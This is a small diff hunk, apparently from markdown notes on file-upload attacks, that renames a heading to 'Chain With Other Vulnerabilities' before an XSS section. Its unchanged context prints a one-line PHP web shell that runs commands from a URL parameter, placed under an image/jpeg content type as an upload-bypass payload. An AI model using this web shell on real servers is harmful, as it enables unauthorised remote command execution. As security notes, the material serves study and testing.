@@ -18,7 +18,7 @@ Content-Type: image/jpeg
 <?php system($_GET['c']);?>
 ```
 
-### Vulnerabilities
+### Chain With Other Vulnerabilities
 
 #### XSS(Cross Site Scripting)
 ```
